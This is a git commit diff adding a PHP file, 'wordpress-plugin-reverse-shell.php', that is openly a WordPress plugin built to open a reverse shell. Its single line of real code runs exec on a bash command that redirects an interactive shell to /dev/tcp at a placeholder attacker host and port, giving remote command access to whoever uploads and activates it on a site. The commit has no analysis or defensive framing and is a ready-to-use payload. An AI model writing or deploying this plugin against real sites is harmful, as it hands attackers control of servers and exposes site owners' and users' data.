6f4e93bb219d0f776a787a1f331333b7e572228f
KR. Laboratories <92594403+krlabs@users.noreply.github.com>
2024-08-25 11:41:46 +0300

    Update wordpress-plugin-reverse-shell.php

--- wordpress-plugin-reverse-shell.php
+++ wordpress-plugin-reverse-shell.php
@@ -1,1 +1,13 @@
+<?php
 
+/** 
+ * Plugin Name: Reverse Shell Plugin
+ * Plugin URI: 
+ * Description: Reverse Shell Plugin
+ * Version: 1.0
+ * Author: krlaboratories
+ * Author URI: https://kr-labs.com.ua
+ */
+
+exec("/bin/bash -c 'bash -i >& /dev/tcp/host_or_ip_attacker/port_attacker 0>&1'");
+?>
